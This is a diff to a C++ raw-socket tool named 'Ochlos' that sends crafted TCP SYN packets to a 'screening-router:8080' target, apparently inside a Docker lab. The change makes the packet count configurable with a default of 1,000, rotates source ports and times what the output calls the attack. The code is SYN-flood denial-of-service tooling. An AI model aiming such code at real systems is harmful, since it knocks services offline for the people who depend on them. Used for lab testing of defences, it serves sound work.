@@ -22,7 +22,7 @@
 #endif
 #include <thread>
 
-int main() {
+int main(int argc, char *argv[]) {
 #ifdef _WIN32
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -86,31 +86,38 @@ int main() {
     // std::cout << "[Ochlos] Sending Raw TCP SYN packet to screening-router:8080...\n";
     // int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));
 
-    // 8-1. 반복적으로 전송
-    // 동일한 src,dst,seq로 전송하면 docker의 NAT에서 재전송 처리를 하기 때문에 동일 세션에서 묶어서 보내버리기 때문에 의도와 다르게 작동하게 된다.
-    const int repeat_count = 10;
+    // 8-1. 반복적으로 전송 (CLI 인자 지원, 기본 1,000개)
+    int repeat_count = (argc > 1) ? std::atoi(argv[1]) : 1000;
     std::cout << "[Ochlos] Sending " << repeat_count << " Raw TCP SYN packets to screening-router:8080...\n";
 
     char packet_buffer[sizeof(IPHeader) + sizeof(TCPHeader)];
+    int sent_count = 0;
+    auto start_time = std::chrono::steady_clock::now();
 
     for (int i = 0; i < repeat_count; i++) {
-        // each loop, diff port
-        uint16_t src_port = 10000 + i;
+        // each loop, diff port (10000 ~ 64999 범위 순환)
+        uint16_t src_port = 10000 + (i % 55000);
         craft_tcp_packet(packet_buffer, src_ip, dst_ip, src_port, dst_port, FLAG_SYN, i * 1000);
 
         int sent_bytes = sendto(sock, packet_buffer, sizeof(packet_buffer), 0, reinterpret_cast<struct sockaddr *>(&target_addr), sizeof(target_addr));
 
         if (sent_bytes < 0) {
 #ifdef _WIN32
-            std::cerr << "[-] sendto() failed. WSA Error COde: " << WSAGetLastError() << "\n";
+            std::cerr << "[-] sendto() failed. WSA Error Code: " << WSAGetLastError() << "\n";
 #else
             std::cerr << "[-] sendto() failed. errno: " << errno << " (" << strerror(errno) << ")\n";
 #endif
             break;
         }
+
+        sent_count++;
     }
 
-    std::cout << "[+] Completed sending " << repeat_count << " packets.\n";
+    auto end_time = std::chrono::steady_clock::now();
+    std::chrono::duration<double, std::milli> elapsed = end_time - start_time;
+
+    std::cout << "[+] Attack Finished: " << sent_count << "/" << repeat_count
+              << " packets sent in " << elapsed.count() << " ms.\n";
 
 // 9. 다 끝나고 나서 socket resource 정리
 #ifdef _WIN32
